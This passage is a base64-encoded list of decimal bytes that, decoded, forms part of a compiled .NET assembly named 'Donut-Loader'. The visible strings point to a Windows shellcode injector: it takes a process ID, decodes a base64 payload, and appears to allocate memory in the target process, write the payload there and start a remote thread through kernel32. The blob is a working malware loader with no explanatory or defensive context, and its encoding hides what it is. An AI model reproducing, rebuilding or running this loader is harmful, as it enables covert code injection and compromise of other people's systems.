ksIDEwMSwgMTE1LCAxMTUsIDAsIDk4LCA3MywgMTEwLCAxMDQsIDEwMSwgMTE0LCAxMDUsIDExNiwgNzIsIDk3LCAxMTAsIDEwMCwgMTA4LCAxMDEsIDAsIDEwMCwgMTE5LCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCA3MywgMTAwLCAwLCAxMDgsIDExMiwgNzcsIDExMSwgMTAwLCAxMTcsIDEwOCwgMTAxLCA3OCwgOTcsIDEwOSwgMTAxLCAwLCAxMDQsIDc3LCAxMTEsIDEwMCwgMTE3LCAxMDgsIDEwMSwgMCwgMTEyLCAxMTQsIDExMSwgOTksIDc4LCA5NywgMTA5LCAxMDEsIDAsIDEwNCwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgMTA4LCAxMTIsIDY1LCAxMDAsIDEwMCwgMTE0LCAxMDEsIDExNSwgMTE1LCAwLCAxMDAsIDExOSwgODMsIDEwNSwgMTIyLCAxMDEsIDAsIDEwMiwgMTA4LCA2NSwgMTA4LCAxMDgsIDExMSwgOTksIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDg0LCAxMjEsIDExMiwgMTAxLCAwLCAxMDIsIDEwOCwgODAsIDExNCwgMTExLCAxMTYsIDEwMSwgOTksIDExNiwgMCwgMTA4LCAxMTIsIDY2LCA5NywgMTE1LCAxMDEsIDY1LCAxMDAsIDEwMCwgMTE0LCAxMDEsIDExNSwgMTE1LCAwLCAxMDgsIDExMiwgNjYsIDExNywgMTAyLCAxMDIsIDEwMSwgMTE0LCAwLCAxMTAsIDgzLCAxMDUsIDEyMiwgMTAxLCAwLCAxMDgsIDExMiwgNzgsIDExNywgMTA5LCA5OCwgMTAxLCAxMTQsIDc5LCAxMDIsIDY2LCAxMjEsIDExNiwgMTAxLCAxMTUsIDg3LCAxMTQsIDEwNSwgMTE2LCAxMTYsIDEwMSwgMTEwLCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNDYsIDczLCAxMTAsIDExNiwgMTAxLCAxMTQsIDExMSwgMTEyLCA4MywgMTAxLCAxMTQsIDExOCwgMTA1LCA5OSwgMTAxLCAxMTUsIDAsIDc5LCAxMTcsIDExNiwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDEwOCwgMTEyLCA4NCwgMTA0LCAxMTQsIDEwMSwgOTcsIDEwMCwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDExNSwgMCwgMTAwLCAxMTksIDgzLCAxMTYsIDk3LCA5OSwgMTA3LCA4MywgMTA1LCAxMjIsIDEwMSwgMCwgMTA4LCAxMTIsIDgzLCAxMTYsIDk3LCAxMTQsIDExNiwgNjUsIDEwMCwgMTAwLCAxMTQsIDEwMSwgMTE1LCAxMTUsIDAsIDEwOCwgMTEyLCA4MCwgOTcsIDExNCwgOTcsIDEwOSwgMTAxLCAxMTYsIDEwMSwgMTE0LCAwLCAxMDAsIDExOSwgNjcsIDExNCwgMTAxLCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCA3MCwgMTA4LCA5NywgMTAzLCAxMTUsIDAsIDEwOCwgMTEyLCA4NCwgMTA0LCAxMTQsIDEwMSwgOTcsIDEwMCwgNzMsIDEwMCwgMCwgMTEyLCAxMTQsIDExMSwgOTksIDgwLCA3MywgNjgsIDAsIDEwOCwgMTEyLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDczLCAxMTAsIDEwMiwgMTExLCAwLCAxMTIsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDQ2LCA4NiwgMTAxLCAxMTQsIDExNSwgMTA1LCAxMTEsIDExMCwgMTA1LCAxMTAsIDEwMywgMCwgODQsIDk3LCAxMTQsIDEwMywgMTAxLCAxMTYsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDEwMSwgMTAyLCAxMDgsIDEwMSwgOTksIDExNiwgMTA1LCAxMTEsIDExMCwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA4NCwgMTA1LCAxMTYsIDEwOCwgMTAxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2OCwgMTAxLCAxMTUsIDk5LCAxMTQsIDEwNSwgMTEyLCAxMTYsIDEwNSwgMTExLCAxMTAsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTEsIDExMCwgMTAyLCAxMDUsIDEwMywgMTE3LCAxMTQsIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTEsIDEwOSwgMTEyLCA5NywgMTEwLCAxMjEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDgwLCAxMTQsIDExMSwgMTAwLCAxMTcsIDk5LCAxMTYsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTEsIDExMiwgMTIxLCAxMTQsIDEwNSwgMTAzLCAxMDQsIDExNiwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgODQsIDExNCwgOTcsIDEwMCwgMTAxLCAxMDksIDk3LCAxMTQsIDEwNywgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgNjcsIDExNywgMTA4LCAxMTYsIDExNywgMTE0LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NywgMTExLCAxMDksIDg2LCAxMDUsIDExNSwgMTA1LCA5OCwgMTA4LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDg2LCAxMDEsIDExNCwgMTE1LCAxMDUsIDExMSwgMTEwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjgsIDEwMSwgOTgsIDExNywgMTAzLCAxMDMsIDk3LCA5OCwgMTA4LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2OCwgMTAxLCA5OCwgMTE3LCAxMDMsIDEwMywgMTA1LCAxMTAsIDEwMywgNzcsIDExMSwgMTAwLCAxMDEsIDExNSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDQ2LCA2NywgMTExLCAxMDksIDExMiwgMTA1LCAxMDgsIDEwMSwgMTE0LCA4MywgMTAxLCAxMTQsIDExOCwgMTA1LCA5OSwgMTAxLCAxMTUsIDAsIDY3LCAxMTEsIDEwOSwgMTEyLCAxMDUsIDEwOCwgOTcsIDExNiwgMTA1LCAxMTEsIDExMCwgODIsIDEwMSwgMTA4LCA5NywgMTIwLCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCAxMTUsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNjcsIDExMSwgMTA5LCAxMTIsIDk3LCAxMTYsIDEwNSwgOTgsIDEwNSwgMTA4LCAxMDUsIDExNiwgMTIxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCAwLCA2NywgMTExLCAxMTAsIDExOCwgMTAxLCAxMTQsIDExNiwgMCwgODQsIDExMSwgNzMsIDExMCwgMTE2LCA1MSwgNTAsIDAsIDY4LCAxMDgsIDEwOCwgNzMsIDEwOSwgMTEyLCAxMTEsIDExNCwgMTE2LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgMTA3LCAxMDEsIDExNCwgMTEwLCAxMDEsIDEwOCwgNTEsIDUwLCA0NiwgMTAwLCAxMDgsIDEwOCwgMCwgMTA3LCAxMDEsIDExNCwgMTEwLCAxMDEsIDEwOCwgNTEsIDUwLCAwLCA3MSwgMTAxLCAxMTYsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDY2LCAxMjEsIDczLCAxMDAsIDAsIDEwMywgMTAxLCAxMTYsIDk1LCA3MywgMTAwLCAwLCA2NywgMTExLCAxMTAsIDExNSwgMTExLCAxMDgsIDEwMSwgMCwgODcsIDExNCwgMTA1LCAxMTYsIDEwMSwgNzYsIDEwNSwgMTEwLCAxMDEsIDAsIDcwLCAxMTQsIDExMSwgMTA5LCA2NiwgOTcsIDExNSwgMTAxLCA1NCwgNTIsIDgzLCAxMTYsIDExNCwgMTA1LCAxMTAsIDEwMywgMCwgNzMsIDExMCwgMTE2LCA4MCwgMTE2LCAxMTQsIDAsIDkwLCAxMDEsIDExNCwgMTExLCAwLCAxMDMsIDEwMSwgMTE2LCA5NSwgNzIsIDk3LCAxMTAsIDEwMCwgMTA4LCAxMDEsIDAsIDQ2LCA5OSwgOTksIDExNiwgMTExLCAxMTQsIDAsIDcxLCAxMDEsIDExNiwgNjcsIDExNywgMTE0LCAxMTQsIDEwMSwgMTEwLCAxMTYsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDAsIDAsIDAsIDEsIDAsIDAsIDUzLCAxODAsIDE1MSwgNTgsIDEwNiwgNDYsIDEyLCA3NCwgMTQ4LCAxMzAsIDYsIDE0LCAxODAsIDQ4LCA2MywgMjMwLCAwLCA4LCAxODMsIDEyMiwgOTIsIDg2LCAyNSwgNTIsIDIyNCwgMTM3LCAyLCA2LCA4LCA0LCAyLCAwLCAwLCAwLCA0LCAwLCA0LCAwLCAwLCA0LCA4LCAwLCAwLCAwLCA0LCAzMiwgMCwgMCwgMCwgNCwgMTYsIDAsIDAsIDAsIDIsIDYsIDksIDQsIDAsIDE2LCAwLCAwLCA0LCAwLCAzMiwgMCwgMCwgNCwgNCwgMCwgMCwgMCwgNCwgNjQsIDAsIDAsIDAsIDIsIDYsIDE0LCA1LCAwLCAxLCAxLCAyOSwgMTQsIDYsIDAsIDMsIDI0LCA4LCAyLCA4LCA0LCAwLCAxLCAyNCwgMTQsIDUsIDAsIDIsIDI0LCAyNCwgMTQsIDgsIDAsIDUsIDI0LCAyNCwgMjQsIDksIDksIDksIDEwLCAwLCA1LCAyLCAyNCwgMjQsIDI5LCA1LCA5LCAxNiwgMjUsIDEwLCAwLCA3LCAyNCwgMjQsIDI0LCA5LCAyNCwgMjQsIDksIDI0LCA2LCAwLCAzLCA4LCAxNCwgMTQsIDgsIDYsIDAsIDIsIDIsIDI0LCAxNiwgMiwgNSwgMCwgMSwgMiwgMTgsIDksIDMsIDMyLCAwLCAxLCA0LCAzMiwgMSwgMSwgMTQsIDQsIDMyLCAxLCAxLCAyLCA1LCAzMiwgMSwgMSwgMTcsIDY1LCA0LCAzMiwgMSwgMSwgOCwgNCwgMCwgMSwgOCwgMTQsIDMsIDcsIDEsIDIsIDUsIDAsIDEsIDE4LCA5LCA4LCAzLCAzMiwgMCwgOCwgNCwgMCwgMSwgMSwgOCwgNSwgMCwgMSwgMjksIDUsIDE0LCAyLCA2LCAyNCwgMTIsIDcsIDgsIDE4LCA5LCAxNCwgMjksIDUsIDI0LCAyNCwgMjUsIDgsIDIsIDMsIDMyLCAwLCAyNCwgNCwgNywgMiwgMiwgMiwgMywgMCwgMCwgMSwgNCwgMCwgMCwgMTgsIDksIDU1LCAxLCAwLCAyNiwgNDYsIDc4LCA2OSwgODQsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA0NCwgODYsIDEwMSwgMTE0LCAxMTUsIDEwNSwgMTExLCAxMTAsIDYxLCAxMTgsIDUyLCA0NiwgNTMsIDEsIDAsIDg0LCAxNCwgMjAsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA2OCwgMTA1LCAxMTUsIDExMiwgMTA4LCA5NywgMTIxLCA3OCwgOTcsIDEwOSwgMTAxLCAwLCAxNywgMSwgMCwgMTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgMCwgMCwgNSwgMSwgMCwgMCwgMCwgMCwgMTksIDEsIDAsIDE0LCA2NywgMTExLCAxMTIsIDEyMSwgMTE0LCAxMDUsIDEwMywgMTA0LCAxMTYsIDMyLCA1MCwgNDgsIDQ5LCA1NywgMCwgMCwgOCwgMSwgMCwgNywgMSwgMCwgMCwgMCwgMCwgOCwgMSwgMCwgOCwgMCwgMCwgMCwgMCwgMCwgMzAsIDEsIDAsIDEsIDAsIDg0LCAyLCAyMiwgODcsIDExNCwgOTcsIDExMiwgNzgsIDExMSwgMTEwLCA2OSwgMTIwLCA5OSwgMTAxLCAxMTIsIDExNiwgMTA1LCAxMTEsIDExMCwgODQsIDEwNCwgMTE0LCAxMTEsIDExOSwgMTE1LCAxLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA0MSwgNjQsIDEzOSwgOTMsIDAsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDI4LCAxLCAwLCAwLCA0OCwgNDUsIDAsIDAsIDQ4LCAyOSwgMCwgMCwgODIsIDgzLCA2OCwgODMsIDY2LCAzMywgMjAzLCAyMTYsIDE4NCwgNDQsIDE5LCA3MywgMTczLCAxMjcsIDEwNywgMjE3LCAxMDcsIDIxMiwgMTY1LCAyMzksIDMsIDAsIDAsIDAsIDk5LCA1OCwgOTIsIDg1LCAxMTUsIDEwMSwgMTE0LCAxMTUsIDkyLCAxMTMsIDUyLCA1NiwgNTcsIDUwLCA1MywgNDgsIDQ5LCA1NiwgOTIsIDY4LCAxMTEsIDk5LCAxMTcsIDEwOSwgMTAxLCAxMTAsIDExNiwgMTE1LCA5MiwgODMsIDEwNCwgOTcsIDExNCwgMTEyLCA2OCwgMTAxLCAxMTgsIDEwMSwgMTA4LCAxMTEsIDExMiwgMzIsIDgwLCAxMTQsIDExMSwgMTA2LCAxMDEsIDk5LCAxMTYsIDExNSwgOTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgOTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgOTIsIDExMSwgOTgsIDEwNiwgOTIsIDY4LCAxMDEsIDk4LCAxMTcsIDEwMywgOTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgNDYsIDExMiwgMTAwLCA5OCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMTYsIDAsIDAsIDAsIDI0LCAwLCAwLCAxMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDEsIDAsIDAsIDAsIDQ4LCAwLCAwLCAxMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAwLCAwLCA4OCwgNjQsIDAsIDAsIDI1MiwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjUyLCAyLCA1MiwgMCwgMCwgMCwgODYsIDAsIDgzLCAwLCA5NSwgMCwgODYsIDAsIDY5LCAwLCA4MiwgMCwgODMsIDAsIDczLCAwLCA3OSwgMCwgNzgsIDAsIDk1LCAwLCA3MywgMCwgNzgsIDAsIDcwLCAwLCA3OSwgMCwgMCwgMCwgMCwgMCwgMTg5LCA0LCAyMzksIDI1NCwgMCwgMCwgMSwgMCwgMCwgMCwgMSwgMCwgMjgsIDgwLCAzOSwgMjgsIDAsIDAsIDEsIDAsIDI4LCA4MCwgMzksIDI4LCA2MywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDAsIDAsIDEsIDAsIDg2LCAwLCA5NywgMCwgMTE0LCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNzMsIDAsIDExMCwgMCwgMTAyLCAwLCAxMTEsIDAsIDAsIDAsIDAsIDAsIDM2LCAwLCA0LCAwLCAwLCAwLCA4NCwgMCwgMTE0LCAwLCA5NywgMCwgMTEwLCAwLCAxMTUsIDAsIDEwOCwgMCwgOTcsIDAsIDExNiwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTc2LCA0LCA5MiwgMiwgMCwgMCwgMSwgMCwgODMsIDAsIDExNiwgMCwgMTE0LCAwLCAxMDUsIDAsIDExMCwgMCwgMTAzLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNzMsIDAsIDExMCwgMCwgMTAyLCAwLCAxMTEsIDAsIDAsIDAsIDU2LCAyLCAwLCAwLCAxLCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDUyLCAwLCA5OCwgMCwgNDgsIDAsIDAsIDAsIDY4LCAwLCAxMywgMCwgMSwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDY4LCAwLCAxMDEsIDAsIDExNSwgMCwgOTksIDAsIDExNCwgMCwgMTA1LCAwLCAxMTIsIDAsIDExNiwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDExMSwgMCwgMTEwLCAwLCAxMTcsIDAsIDExNiwgMCwgNDUsIDAsIDc2LCAwLCAxMTEsIDAsIDk3LCAwLCAxMDAsIDAsIDEwMSwgMCwgMTE0LCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMTUsIDAsIDEsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA4NiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExNSwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgNDksIDAsIDQ2LCAwLCA0OCwgMCwgNDYsIDAsIDU1LCAwLCA1MCwgMCwgNDgsIDAsIDU1LCAwLCA0NiwgMCwgNTAsIDAsIDQ4LCAwLCA1MywgMCwgNDgsIDAsIDU2LCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMTcsIDAsIDEsIDAsIDczLCAwLCAxMTAsIDAsIDExNiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExMCwgMCwgOTcsIDAsIDEwOCwgMCwgNzgsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgNjgsIDAsIDExMSwgMCwgMTEwLCAwLCAxMTcsIDAsIDExNiwgMCwgNDUsIDAsIDc2LCAwLCAxMTEsIDAsIDk3LCAwLCAxMDAsIDAsIDEwMSwgMCwgMTE0LCAwLCA0NiwgMCwgMTAwLCAwLCAxMDgsIDAsIDEwOCwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDE1LCAwLCAxLCAwLCA3NiwgMCwgMTAxLCAwLCAxMDMsIDAsIDk3LCAwLCAxMDgsIDAsIDY3LCAwLCAxMTEsIDAsIDExMiwgMCwgMTIxLCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDQsIDAsIDExNiwgMCwgMCwgMCwgNjcsIDAsIDExMSwgMCwgMTEyLCAwLCAxMjEsIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNCwgMCwgMTE2LCAwLCAzMiwgMCwgNTAsIDAsIDQ4LCAwLCA0OSwgMCwgNTcsIDAsIDAsIDAsIDAsIDAsIDc2LCAwLCAxNywgMCwgMSwgMCwgNzksIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNSwgMCwgMTEwLCAwLCA5NywgMCwgMTA4LCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgMTEwLCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDY4LCAwLCAxMTEsIDAsIDExMCwgMCwgMTE3LCAwLCAxMTYsIDAsIDQ1LCAwLCA3NiwgMCwgMTExLCAwLCA5NywgMCwgMTAwLCAwLCAxMDEsIDAsIDExNCwgMCwgNDYsIDAsIDEwMCwgMCwgMTA4LCAwLCAxMDgsIDAsIDAsIDAsIDAsIDAsIDYwLCAwLCAxMywgMCwgMSwgMCwgODAsIDAsIDExNCwgMCwgMTExLCAwLCAxMDAsIDAsIDExNywgMCwgOTksIDAsIDExNiwgMCwgNzgsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDExMSwgMCwgMTEwLCAwLCAxMTcsIDAsIDExNiwgMCwgNDUsIDAsIDc2LCAwLCAxMTEsIDAsIDk3LCAwLCAxMDAsIDAsIDEwMSwgMCwgMTE0LCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMTUsIDAsIDEsIDAsIDgwLCAwLCAxMTQsIDAsIDExMSwgMCwgMTAwLCAwLCAxMTcsIDAsIDk5LCAwLCAxMTYsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDUwLCAwLCA0OCwgMCwgNTUsIDAsIDQ2LCAwLCA1MCwgMCwgNDgsIDAsIDUzLCAwLCA0OCwgMCwgNTYsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAxNSwgMCwgMSwgMCwgNjUsIDAsIDExNSwgMCwgMTE1LCAwLCAxMDEsIDAsIDEwOSwgMCwgOTgsIDAsIDEwOCwgMCwgMTIxLCAwLCAzMiwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNTAsIDAsIDQ4LCAwLCA1NSwgMCwgNDYsIDAsIDUwLCAwLCA0OCwgMCwgNTMsIDAsIDQ4LCAwLCA1NiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgM